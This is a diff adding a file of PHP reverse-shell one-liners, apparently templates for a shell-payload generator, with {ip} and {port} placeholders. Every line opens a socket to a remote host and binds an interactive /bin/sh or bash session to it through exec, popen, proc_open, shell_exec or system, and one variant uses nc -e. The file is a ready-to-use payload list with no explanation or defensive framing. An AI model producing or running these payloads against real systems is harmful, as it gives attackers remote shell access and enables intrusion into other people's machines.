@@ -1,0 +1,15 @@
+php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'
+———
+php -r '$sock=fsockopen("{ip}",{port});exec("nc -e /bin/sh {ip} {port}");'
+———
+php -r '$sock=fsockopen("{ip}",{port});exec("/bin/bash -i <&3 >&3 2>&3");'
+———
+php -r '$sock=fsockopen("{ip}",{port});exec("bash -i <&3 >&3 2>&3");'
+———
+php -r '$sock=fsockopen("{ip}",{port});popen("/bin/sh -i","r");'
+———
+php -r '$sock=fsockopen("{ip}",{port});proc_open("/bin/sh", [["socket", $sock, "r"], ["socket", $sock, "w"], ["socket", $sock, "w"]], $pipes);'
+———
+php -r '$sock=fsockopen("{ip}",{port});shell_exec("/bin/sh -i <&3 >&3 2>&3");'
+———
+php -r '$sock=fsockopen("{ip}",{port});system("bash -i <&3 >&3 2>&3");shell_exec("bash -i <&3 >&3 2>&3");'
